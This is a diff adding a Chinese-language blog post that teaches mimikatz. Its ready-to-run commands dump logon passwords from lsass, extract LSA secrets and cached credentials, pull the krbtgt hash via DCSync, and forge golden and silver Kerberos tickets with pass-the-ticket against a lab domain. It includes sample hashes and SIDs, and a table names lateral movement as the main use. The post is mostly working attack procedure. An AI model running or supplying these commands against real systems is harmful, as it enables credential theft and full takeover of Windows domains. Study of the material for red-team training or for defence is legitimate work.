@@ -1,0 +1,237 @@
+---
+layout: post
+title: mimikatz 使用教程
+subtitle: mimikatz
+date: 2024-07-30 09:20
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags: 
+published: true
+---
+> [!NOTE]
+> 项目地址：[gentilkiwi/mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz)
+
+## 1. 基本介绍
+
+**mimikatz** 是一款功能强大的轻量级进程调试工具，在安全领域最大的亮点就是他可以直接从 lsass 中获取当前处于 Active 系统的登录密码
+
+## 2. 基本使用
+
+### 2.1. 获取本地密码
+
+**获取调试权限**
+
+```batch
+# 以管理员运行
+privilege::debug
+```
+
+**抓取密码**
+
+```batch
+sekurlsa::logonpasswords # 获登陆用户信息及密码
+# 抓取密码并导出到文件
+mimikatz ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit >> log.txt
+```
+
+**获取所有用户 hash**
+
+```batch
+privilege::debug
+lsadump::lsa /path
+# 使用当前用户的权限提升为系统级（NT AUTHORITY\SYSTEM）
+# 通过提取并使用系统 Token，模拟最高权限用户
+token::elevate
+# 提取存储在注册表中的 LSA 机密数据
+lsadump::secrets
+# 执行并导出
+mimikatz ""privilege::debug"" ""token::elevate"" ""lsadump::secrets"" exit >> log.txt
+```
+
+| 功能模块   | lsadump::secrets                                   |
+| ------ | -------------------------------------------------- |
+| **提取内容**   | 本地 LSA 机密信息，如服务账户密码、本地登录密码                         |
+| **适用场景**   | 本地系统服务、机器账户的分析和利用                                  |
+| **信息存储位置** | 注册表路径：`HKLM\SYSTEM\CurrentControlSet\Services\LSA` |
+| **提取内容类型** | 明文密码、敏感配置项                                         |
+| **主要用途**   | 横向移动、服务账户攻击                                        |
+
+**缓存提取用户密码凭证**
+
+```batch
+privilege::debug
+lsadump::cache
+#用于获取登录过的账户的信息，尤其在域环境中非常有用 
+#目标数据包括 本地缓存的登录凭据， Windows 会话缓存中的用户名和密码哈希
+```
+
+```batch
+klist # cmd 票证缓存
+```
+
+### 2.2. 黄金票据制作
+
+所需参数：
+- 域名：目标域的 FQDN
+- SID：域的安全标识符，可以通过 `whoami /user` 或 AD 工具提取
+- KRBTGT 哈希：KRBTGT 帐户的 NTLM 哈希，需从域控中提取
+- 用户名：要伪造的用户（通常是管理员账户）
+
+#### 2.2.1. 获取参数信息
+
+##### 获取 krbtgt 哈希
+
+```batch
+mimikatz "privilege::debug" "lsadump::dcsync /domain:work.com /user:krbtgt" exit
+# 239ad56d36d09131a3584cdc25761616
+```
+
+![image.png](https://img.ghostliner.top/KUkzzm.png)
+
+##### 获取域控 SID
+
+```batch
+whoami /user #当前用户的SID
+wmic useraccount get name,sid #系统所有用户的SID
+# Administrator   S-1-5-21-3644623682-4019055222-2476599189-500
+```
+
+![image.png](https://img.ghostliner.top/jkR8Uw.png)
+
+##### 要伪造的用户
+
+```batch
+# 查看域内管理员组成员
+net group "domain admins" /domain
+```
+
+##### 域 FQDN
+
+```batch
+ipconfig /all
+```
+
+![image.png](https://img.ghostliner.top/yhDCUJ.png)
+
+#### 2.2.2. 制作黄金票据
+
+所需信息
+
+```
+work.com # 域FQDN
+administrator # 管理员账户
+239ad56d36d09131a3584cdc25761616 # krbtgt用户哈希
+S-1-5-21-3644623682-4019055222-2476599189 # 域SID
+```
+
+制作票据
+
+```batch
+# 列出当前会话中缓存的 Kerberos 票据
+mimikatz "kerberos::list" exit
+# 清空当前Kerberos 票据
+mimikatz "kerberos::purge" exit
+# 制作黄金票据
+mimikatz "kerberos::golden /user:Administrator /domain:work.com /sid:S-1-5-21-3644623682-4019055222-2476599189 /krbtgt:239ad56d36d09131a3584cdc25761616 /ptt" exit
+```
+
+生成黄金票据文件
+
+```batch
+mimikatz "kerberos::golden /user:Administrator /domain:work.com /sid:S-1-5-21-3644623682-4019055222-2476599189 /krbtgt:239ad56d36d09131a3584cdc25761616 /ticket:Administrator.kiribi" exit
+#使用时导入
+mimikatz "kerberos::ptt Administrator.kiribi" exit
+```
+
+### 2.3. 白银票据制作
+
+**所需参数：**
+
+- /user：目标用户名
+- /domain：目标域
+- sid：域 SID
+- /rc4：服务账户 NTLM 哈希
+- /service：目标服务 SPN
+- /target：目标主机
+- /ptt：将票据加载到票据缓存中
+
+#### 2.3.1. 获取所需参数
+
+##### 用户名
+
+```batch
+# 查看域内管理员组成员
+net group "domain admins" /domain
+```
+
+得到 `administrator`
+
+##### 域名
+
+```batch
+# 获取域的FQDN
+ipconfig /all
+```
+
+![image.png](https://img.ghostliner.top/yhDCUJ.png)
+
+##### SID
+
+```batch
+# 获取系统所有用户的SID
+wmic useraccount get name,sid
+```
+
+![image.png](https://img.ghostliner.top/jkR8Uw.png)
+
+##### 服务账户的 NTLM 哈希
+
+内置服务账户、由操作系统预定义，权限固定，适用于运行系统服务。
+常见内置服务账户：
+- LocalSystem：本地系统账户，最高权限
+- Network Service：网络服务账户，较低权限
+- Local Service：本地服务账户，最低权限
+- 用于域中的计算机对象，通常以`$`结尾。例如：`DC$`（域控制器计算机账户）、`Workstation$`（工作站计算机账户）
+
+```batch
+# 查看服务账户的哈希
+mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+
+![image.png](https://img.ghostliner.top/xWXeO8.png)
+
+##### 目标服务的主体名称
+
+```batch
+# 域管理员可以通过 setspn 查看和管理 SPN
+setspn -L DC$
+```
+
+![image.png](https://img.ghostliner.top/XZmX6Q.png)
+
+#### 2.3.2. 制作白银票据
+
+##### 已收集信息
+
+```text
+work.com # 域的FQDN 
+Administrator # 管理员账号 
+S-1-5-21-3644623682-4019055222-2476599189 # 域的SID
+a3457f8fbad178153d6d2f177e3dec64 #服务账户的 NTLM 哈希 
+cifs #服务的主体名称
+```
+
+##### 伪造票据
+
+```batch
+# 清空当前Kerberos 票据
+klist purge
+# 制作白银票据
+mimikatz "kerberos::golden /user:administrator /domain:work.com /sid:S-1-5-21-3644623682-4019055222-2476599189 /target:dc.work.com /rc4:a3457f8fbad178153d6d2f177e3dec64 /service:cifs /ptt" exit
+```
+
+##### 验证
+
+成功访问域控服务
+
+![image.png](https://img.ghostliner.top/HstfZU.png)
